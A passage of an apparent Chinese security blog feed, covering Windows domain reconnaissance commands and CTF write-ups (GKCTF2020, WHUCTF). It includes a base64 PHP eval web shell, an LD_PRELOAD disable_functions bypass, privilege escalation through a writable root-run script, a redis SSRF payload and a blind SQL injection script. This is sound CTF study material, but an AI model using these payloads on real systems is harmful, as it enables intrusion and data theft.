class="line">netsh interface ipv4 set address name=&quot;本地连接&quot; source=static addr=192.168.10.212 mask= 255.255.255.0 gateway=192.168.10.1</span><br><span class="line">netsh interface ipv4 set dnsserver &quot;本地连接&quot; static 192.168.10.200 primary</span><br><span class="line">netdom join %computername% /domain:http://ESS.COM /userd:administrator /passwordD:a1! /REBoot:5</span><br><span class="line"></span><br><span class="line">net user ------&gt; 本机用户列表</span><br><span class="line">net localhroup administrators ------&gt; 本机管理员[通常含有域用户]</span><br><span class="line">net user /domain ------&gt; 查询域用户</span><br><span class="line">net group /domain ------&gt; 查询域里面的工作组</span><br><span class="line">net group &quot;domain admins&quot; /domain ------&gt; 查询域管理员用户组</span><br><span class="line">net localgroup administrators /domain ------&gt; 登录本机的域管理员</span><br><span class="line">net localgroup administrators workgroup\user001 /add -----&gt;域用户添加到本机</span><br><span class="line">net group &quot;Domain controllers&quot; -------&gt; 查看域控制器(如果有多台)</span><br><span class="line">ipconfig /all ------&gt; 查询本机IP段，所在域等</span><br><span class="line">net view ------&gt; 查询同一域内机器列表</span><br><span class="line">net view /domain ------&gt; 查询域列表</span><br><span class="line">net view /domain:domainname -----&gt; 查看workgroup域中计算机列表</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>参考：</p><p><a href="https://www.cnblogs.com/lip-blog/p/7658839.html">https://www.cnblogs.com/lip-blog/p/7658839.html</a></p><p><a href="https://blog.csdn.net/WPwalter/article/details/89838881">https://blog.csdn.net/WPwalter/article/details/89838881</a></p><p><a href="https://zhuanlan.zhihu.com/p/32287774">https://zhuanlan.zhihu.com/p/32287774</a></p><p><a href="https://www.cnblogs.com/mq0036/p/3518542.html">https://www.cnblogs.com/mq0036/p/3518542.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GKCTF2020 writeup</title>
      <link href="2020/05/24/GKCTF2020-writeup/"/>
      <url>2020/05/24/GKCTF2020-writeup/</url>
      
        <content type="html"><![CDATA[<p>由防灾科技学院&amp;Bugfor举办的比赛，记一下！</p><a id="more"></a><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="CheckIN"><a href="#CheckIN" class="headerlink" title="CheckIN"></a>CheckIN</h3><p>base64加密一下，先往/tmp下写个马，然后包含这个马，蚁剑连上LD_PRELOAD bypass disable_function</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents(<span class="string">&quot;/tmp/1.php&quot;</span>, base64_decode(<span class="string">&quot;PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs=&quot;</span>));</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;/tmp/moonback&#x27;</span>);</span><br></pre></td></tr></table></figure><p>贴一下php exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;&quot;</span>;</span><br><span class="line">    $cmd = $_GET[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line">    $out_path = $_GET[<span class="string">&quot;outpath&quot;</span>];</span><br><span class="line">    $evil_cmdline = $cmd . <span class="string">&quot; &gt; &quot;</span> . $out_path . <span class="string">&quot; 2&gt;&amp;1&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot;</span> . $evil_cmdline . <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    putenv(<span class="string">&quot;EVIL_CMDLINE=&quot;</span> . $evil_cmdline);</span><br><span class="line">    $so_path = $_GET[<span class="string">&quot;sopath&quot;</span>];</span><br><span class="line">    putenv(<span class="string">&quot;LD_PRELOAD=&quot;</span> . $so_path);</span><br><span class="line">    mail(<span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot;</span> . nl2br(file_get_contents($out_path)) . <span class="string">&quot;&lt;/p&gt;&quot;</span>; </span><br><span class="line">    unlink($out_path);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="老八小超市儿"><a href="#老八小超市儿" class="headerlink" title="老八小超市儿"></a>老八小超市儿</h3><p>默认密码，admin shopxo，后台上传主题getshell</p><p>蚁剑连上发现flag是假的，hint提示GET root,试了好多办法都不行</p><p>后来发现有auto.sh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span> (python /var/mail/makeflaghint.py &amp;) &amp;&amp; sleep 60; <span class="keyword">done</span></span><br></pre></td></tr></table></figure><p>看了下进程是以root运行的，并且所有者是root</p><p>makeflaghint.py:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">os.system(<span class="string">&quot;whoami&quot;</span>)</span><br><span class="line">gk1=str(time.ctime())</span><br><span class="line">gk=<span class="string">&quot;\nGet The RooT,The Date Is Useful!&quot;</span></span><br><span class="line">f=io.open(<span class="string">&quot;/flag.hint&quot;</span>, <span class="string">&quot;rb+&quot;</span>)</span><br><span class="line">f.write(str(gk1))</span><br><span class="line">f.write(str(gk))</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>这个文件就很特殊了</p><img src="/2020/05/24/GKCTF2020-writeup/TIM截图20200524154415.png" style="zoom:80%;"><p>所有用户对它都可写，因为上面auto.sh是以root运行的，并且里面调用了makeflaghint.py，相当于root运行makeflaghint.py，我们就可以改下内容，增加一行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.system(<span class="string">&#x27;cat /root/flag &gt; a&#x27;</span>)</span><br></pre></td></tr></table></figure><p>就能getflag了，真没想到！！！</p><h3 id="cve版签到"><a href="#cve版签到" class="headerlink" title="cve版签到"></a>cve版签到</h3><p>hint说<code>cve-2020-7066</code>，看一下介绍：</p><p><img src="/2020/05/24/GKCTF2020-writeup/TIM%E6%88%AA%E5%9B%BE20200524160449.png"></p><p>然后又在题目响应头里看到</p><img src="/2020/05/24/GKCTF2020-writeup/TIM截图20200524160555.png" style="zoom:80%;"><p>然后构造flag就出来了，没搞懂23333</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url&#x3D;http:&#x2F;&#x2F;127.0.0.123%00.ctfhub.com</span><br></pre></td></tr></table></figure><h3 id="EZ三剑客-EzWeb"><a href="#EZ三剑客-EzWeb" class="headerlink" title="EZ三剑客-EzWeb"></a>EZ三剑客-EzWeb</h3><p>查看源码，发现<code>?secret</code>，访问发现给出了靶机ip</p><p>直接用本机ip试发现</p><img src="/2020/05/24/GKCTF2020-writeup/TIM截图20200526094434.png" style="zoom:50%;"><p>bp fuzz一下：</p><img src="/2020/05/24/GKCTF2020-writeup/TIM截图20200526100323.png" style="zoom: 80%;"><p>在<code>173.167.10.11</code>看到</p><img src="/2020/05/24/GKCTF2020-writeup/TIM截图20200526100709.png" style="zoom:80%;"><p>提示要测试端口，试下</p><p><img src="/2020/05/24/GKCTF2020-writeup/TIM%E6%88%AA%E5%9B%BE20200526101028.png"></p><p>redis未授权访问，写shell，直接用Gopherus生成payload</p><img src="/2020/05/24/GKCTF2020-writeup/TIM截图20200526102304.png" style="zoom:80%;"><p>注意要url二次编码</p><img src="/2020/05/24/GKCTF2020-writeup/TIM截图20200526102428.png" style="zoom:67%;"><h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="小学生的密码学"><a href="#小学生的密码学" class="headerlink" title="小学生的密码学"></a>小学生的密码学</h3><p>仿射密码，直接在线网站解：</p><p><a href="https://aliyunvi.com/affine">https://aliyunvi.com/affine</a></p><p>加密形式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e(x)&#x3D;ax+b (mod 26)</span><br></pre></td></tr></table></figure><h3 id="汉字的秘密"><a href="#汉字的秘密" class="headerlink" title="汉字的秘密"></a>汉字的秘密</h3><p>当铺密码</p><img src="/2020/05/24/GKCTF2020-writeup/TIM截图20200524161626.png" style="zoom:80%;"><p>原文：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">王壮 夫工 王中 王夫 由由井 井人 夫中 夫夫 井王 土土 夫由</span><br><span class="line">土夫 井中 士夫 王工 王人 土由 由口夫</span><br></pre></td></tr></table></figure><p>替换后:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">69 74 62 67 118 83 72 77 86 55 71</span><br><span class="line">57 82 57 64 63 51 107</span><br></pre></td></tr></table></figure><p>接着转ascii得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">EJ&gt;CvSHMV7G</span><br><span class="line">9R9@?3k</span><br></pre></td></tr></table></figure><p>应该想到的,tcl，E和F差1，J和L差2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">&#x27;EJ&gt;CvSHMV7G9R9@?3k&#x27;</span></span><br><span class="line">j=<span class="number">1</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">flag=flag+chr(ord(i)+j)</span><br><span class="line">j=j+<span class="number">1</span></span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment"># flag&#123;you_are_good&#125;</span></span><br></pre></td></tr></table></figure><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="Pokémon"><a href="#Pokémon" class="headerlink" title="Pokémon"></a>Pokémon</h3><p>真就玩游戏就给flag，用VisualBoyAdvance打开玩就完事了</p><img src="/2020/05/24/GKCTF2020-writeup/TIM截图20200525185522.png" style="zoom:80%;"><p>flag:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;PokEmon_14_CutE&#125;</span><br></pre></td></tr></table></figure><h3 id="Harley-Quinn"><a href="#Harley-Quinn" class="headerlink" title="Harley Quinn"></a>Harley Quinn</h3><p>压缩包描述里有提示,搜了下，发现是﻿FreeFileCamouflage一种隐写方式，可将文件隐写在JPG图片中</p><img src="/2020/05/24/GKCTF2020-writeup/TIM截图20200525190609.png" style="zoom:80%;"><p>解压在Heathens.wav属性里看到hint</p><img src="/2020/05/24/GKCTF2020-writeup/TIM截图20200525190821.png" style="zoom:80%;"><p>最后一段是拨号音，对照频谱</p><p><strong>DTMF对照表</strong></p><table><thead><tr><th>低频 \ 高频(Hz)</th><th>1209</th><th>1336</th><th>1477</th><th>1633</th></tr></thead><tbody><tr><td>697</td><td>1</td><td>2</td><td>3</td><td>A</td></tr><tr><td>770</td><td>4</td><td>5</td><td>6</td><td>B</td></tr><tr><td>852</td><td>7</td><td>8</td><td>9</td><td>C</td></tr><tr><td>941</td><td>*</td><td>0</td><td>#</td><td>D</td></tr></tbody></table><p>或者直接使用<code>dtmf2num.exe</code></p><img src="/2020/05/24/GKCTF2020-writeup/TIM截图20200525192817.png" style="zoom: 80%;"><p>得出拨号音：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#222833344477773338866#</span><br></pre></td></tr></table></figure><img src="/2020/05/24/GKCTF2020-writeup/u=2226515071,1685276597&amp;fm=26&amp;gp=0.jpg" style="zoom:80%;"><p>三个2代表2的第三个字母即c，以此类推得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfisfun</span><br></pre></td></tr></table></figure><p>然后解密就行</p><p><img src="/2020/05/24/GKCTF2020-writeup/TIM%E6%88%AA%E5%9B%BE20200525205317.png"></p><p>会得到flag.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Pudd1n!!_y0u_F1nd_m3!&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WHUCTF web wp</title>
      <link href="2020/05/23/WHUCTF-web-wp/"/>
      <url>2020/05/23/WHUCTF-web-wp/</url>
      
        <content type="html"><![CDATA[<p>武汉大学萌新赛的题目，做做吧！</p><a id="more"></a><h2 id="Easy-sqli"><a href="#Easy-sqli" class="headerlink" title="Easy_sqli"></a>Easy_sqli</h2><p>有sql语句回显，很友好了，exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://218.197.154.9:10011/login.php&quot;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">proxies=&#123;</span><br><span class="line"><span class="string">&#x27;http&#x27;</span>:<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># easy_sql1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">f1=flag</span><br><span class="line">top=<span class="number">127</span></span><br><span class="line">low=<span class="number">33</span></span><br><span class="line"><span class="keyword">while</span> low&lt;=top:</span><br><span class="line">mid=(top+low)//<span class="number">2</span></span><br><span class="line">print(mid)</span><br><span class="line">data=&#123;</span><br><span class="line"><span class="string">&#x27;user&#x27;</span>:<span class="string">&quot;admin&#x27; and if(ascii(substring((selselectect group_concat(table_name) frfromom infoorrmation_schema.tables whewherere table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;,sleep(3),0)#&quot;</span>.format(str(i),str(mid)),</span><br><span class="line"><span class="string">&#x27;pass&#x27;</span>:<span class="string">&#x27;admin&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">data1=&#123;</span><br><span class="line"><span class="string">&#x27;user&#x27;</span>:<span class="string">&quot;admin&#x27; and if(ascii(substring((selselectect group_concat(table_name) frfromom infoorrmation_schema.tables whewherere table_schema=database()),&#123;&#125;,1))=&#123;&#125;,sleep(3),0)#&quot;</span>.format(str(i),str(mid)),</span><br><span class="line"><span class="string">&#x27;pass&#x27;</span>:<span class="string">&#x27;admin&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">r1=requests.post(url,data=data1,timeout=<span class="number">3</span>,proxies=proxies)</span><br><span class="line"><span class="keyword">except</span> requests.exceptions.ReadTimeout <span class="keyword">as</span> e:</span><br><span class="line">flag=flag+chr(mid)</span><br><span class="line">print(chr(mid))</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">r=requests.post(url,data=data,timeout=<span class="number">3</span>,proxies=proxies)</span><br><span class="line"><span class="keyword">except</span> requests.exceptions.ReadTimeout <span class="keyword">as</span> e:</span><br><span class="line">low=mid+<span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">top=mid<span class="number">-1</span></span><br><span class="line"><span class="keyword">if</span> flag==f1:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>爆数据库：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data=&#123;</span><br><span class="line"><span class="string">&#x27;user&#x27;</span>:<span class="string">&quot;admin&#x27; and if(ascii(substring((database()),&#123;&#125;,1))=&#123;&#125;,sleep(3),0)#&quot;</span>.format(str(i),str(mid)),</span><br><span class="line"><span class="string">&#x27;pass&#x27;</span>:<span class="string">&#x27;admin&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># easy_sql1</span></span><br></pre></td></tr></table></figure><p>爆表：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data=&#123;</span><br><span class="line"><span class="string">&#x27;user&#x27;</span>:<span class="string">&quot;admin&#x27; and if(ascii(substring((selselectect group_concat(table_name) frfromom infoorrmation_schema.tables whewherere table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;,sleep(3),0)#&quot;</span>.format(str(i),str(mid)),</span><br><span class="line"><span class="string">&#x27;pass&#x27;</span>:<span class="string">&#x27;admin&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># f1ag_y0u_wi1l_n3ver_kn0w,users</span></span><br></pre></td></tr></table></figure><p>爆字段：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data=&#123;</span><br><span class="line"><span class="string">&#x27;user&#x27;</span>:<span class="string">&quot;admin&#x27; and if(ascii(substring((selselectect group_concat(column_name) frfromom infoorrmation_schema.columns whewherere table_schema=database() and table_name=&#x27;f1ag_y0u_wi1l_n3ver_kn0w&#x27; ),&#123;&#125;,1))&gt;&#123;&#125;,sleep(3),0)#&quot;</span>.format(str(i),str(mid)),</span><br><span class="line"><span class="string">&#x27;pass&#x27;</span>:<span class="string">&#x27;admin&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># f111114g</span></span><br></pre></td></tr></table></figure><p>爆内容：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data=&#123;</span><br><span class="line"><span class="string">&#x27;user&#x27;</span>:<span class="string">&quot;admin&#x27; and if(ascii(substring((selselectect group_concat(f111114g) frfromom easy_sql1.f1ag_y0u_wi1l_n3ver_kn0w),&#123;&#125;,1))&gt;&#123;&#125;,sleep(3),0)#&quot;</span>.format(str(i),str(mid)),</span><br><span class="line"><span class="string">&#x27;pass&#x27;</span>:<span class="string">&#x27;admin&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># WHUCTF&#123;r3lly_re11y_n0t_d1ffIcult_yet??~&#125;</span></span><br></pre></td></tr></table></figure><h2 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line">$string_1 = $_GET[<span class="string">&#x27;str1&#x27;</span>];</span><br><span class="line">$string_2 = $_GET[<span class="string">&#x27;str2&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//1st</span></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">&#x27;num&#x27;</span>] !== <span class="string">&#x27;23333&#x27;</span> &amp;&amp; preg_match(<span class="string">&#x27;/^23333$/&#x27;</span>, $_GET[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;1st ok&#x27;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;会代码审计嘛23333&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//2nd</span></span><br><span class="line"><span class="keyword">if</span>(is_numeric($string_1))&#123;</span><br><span class="line">    $md5_1 = md5($string_1);</span><br><span class="line">    $md5_2 = md5($string_2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($md5_1 != $md5_2)&#123;</span><br><span class="line">        $a = strtr($md5_1, <span class="string">&#x27;pggnb&#x27;</span>, <span class="string">&#x27;12345&#x27;</span>);</span><br><span class="line">        $b = strtr($md5_2, <span class="string">&#x27;pggnb&#x27;</span>, <span class="string">&#x27;12345&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>($a == $b)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;2nd ok&#x27;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;can u give me the right str???&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no!!!!!!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;is str1 numeric??????&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//3nd</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$string</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="string">&#x27;/x/&#x27;</span>, <span class="string">&#x27;yy&#x27;</span>, $string);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = $_POST[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"></span><br><span class="line">$password = <span class="string">&quot;aaaaa&quot;</span>;</span><br><span class="line">$user = <span class="keyword">array</span>($username, $password);</span><br><span class="line"></span><br><span class="line">$r = filter(serialize($user));</span><br><span class="line"><span class="keyword">if</span>(unserialize($r)[<span class="number">1</span>] == <span class="string">&quot;123456&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>第一层很好绕，直接%0a就行</p><p>第二层要求两个数md5不相等，经过strtr函数替换，该函数相当于生成一个替换字典，按照字典键值替换</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">strtr($md5_1, <span class="string">&#x27;pggnb&#x27;</span>, <span class="string">&#x27;12345&#x27;</span>)</span><br><span class="line"><span class="comment">// 相当于</span></span><br><span class="line"><span class="comment">// p-&gt;1 g-&gt;3 n-&gt;4 b-&gt;5</span></span><br></pre></td></tr></table></figure><p>这样就可以写一个脚本(不是我写的)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">1</span>; $i &lt;= <span class="number">100000000</span>; $i++) &#123;</span><br><span class="line">    $md5 = strtr(md5($i), <span class="string">&#x27;pggnb&#x27;</span>, <span class="string">&#x27;12345&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/^0e\d+$/&#x27;</span>, $md5)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $i . <span class="string">&quot; &quot;</span> . md5($i) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        $count++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ($count == <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 11230178 0e732639146814822596b49bb6939b97</span></span><br><span class="line"><span class="comment">// 20493141 0e343359461627b56649445b748588b8</span></span><br><span class="line"><span class="comment">// 替换后0e后面均为纯数字</span></span><br></pre></td></tr></table></figure><p>最后一点相等利用php认为0e开头且后面是纯数字的都相等的特性</p><p>最后一关是反序列化字符逃逸，正常序列化的结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;i:<span class="number">1</span>;s:<span class="number">5</span>:<span class="string">&quot;aaaaa&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>确定要添加的内容,长度为20</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;;i:1;s:6:&quot;</span><span class="number">123456</span><span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>列方程，n为x字符数量，y为其他字符</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n+y+<span class="number">20</span>=<span class="number">2</span>n+y</span><br></pre></td></tr></table></figure><p>解得n=20，故构造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=xxxxxxxxxxxxxxxxxxxx<span class="string">&quot;;i:1;s:6:&quot;</span><span class="number">123456</span><span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure><img src="/2020/05/23/WHUCTF-web-wp/TIM截图20200523203712.png" style="zoom:67%;"><p>查看源码得到flag</p><h2 id="ezcmd"><a href="#ezcmd" class="headerlink" title="ezcmd"></a>ezcmd</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 